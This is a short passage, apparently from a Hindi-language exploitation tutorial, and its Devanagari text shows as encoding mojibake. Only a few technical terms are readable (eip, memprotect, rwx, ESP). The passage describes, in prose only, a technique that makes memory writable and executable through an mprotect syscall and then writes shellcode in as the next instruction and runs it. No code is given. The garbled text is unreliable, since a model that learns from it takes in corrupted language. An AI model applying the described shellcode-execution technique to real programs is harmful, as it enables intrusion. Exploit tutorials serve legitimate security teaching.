‡§ú‡•ã ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§∏‡•á‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ `eip` ‡§ï‡•ã ‡§™‡§ø‡§õ‡§≤‡•á ‡§∏‡§ø‡§∏‡§ï‡•â‡§≤ ‡§á‡§Ç‡§∏‡•ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ `memprotect` ‡§ï‡•ã ‡§ö‡§≤‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•á‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§∏‡•ç‡§™‡•á‡§∏ ‡§ï‡•ã `rwx` ‡§î‡§∞ ESP ‡§ï‡•ã ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§∏‡•ç‡§™‡•á‡§∏ ‡§Æ‡•á‡§Ç ‡§∏‡•á‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ‡•§ ‡§´‡•ç‡§≤‡•ã ‡§ï‡§æ ‡§™‡§æ‡§≤‡§® ‡§ï‡§∞‡§§‡•á ‡§π‡•Å‡§è, ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§´‡§ø‡§∞ ‡§∏‡•á ESP ‡§Æ‡•á‡§Ç ‡§™‡§¢‡§º‡§®‡•á ‡§ï‡•ã ‡§ï‡•â‡§≤ ‡§ï‡§∞‡•á‡§ó‡§æ, ‡§≤‡•á‡§ï‡§ø‡§® ‡§á‡§∏ ‡§Æ‡§æ‡§Æ‡§≤‡•á ‡§Æ‡•á‡§Ç ESP ‡§Ö‡§ó‡§≤‡•á ‡§á‡§Ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§® ‡§ï‡•ã ‡§™‡•â‡§á‡§Ç‡§ü ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•ã‡§ó‡§æ ‡§á‡§∏‡§≤‡§ø‡§è ‡§∂‡•à‡§≤‡§ï‡•ã‡§° ‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§™‡§∞ ‡§Ø‡§π ‡§á‡§∏‡•á ‡§Ö‡§ó‡§≤‡•á ‡§á‡§Ç‡§ü‡•ç‡§∞‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡•á‡§ó‡§æ ‡§î‡§∞ ‡§á‡§∏‡•á ‡§ö‡§≤‡§æ‡§è‡§ó‡§æ‡•§
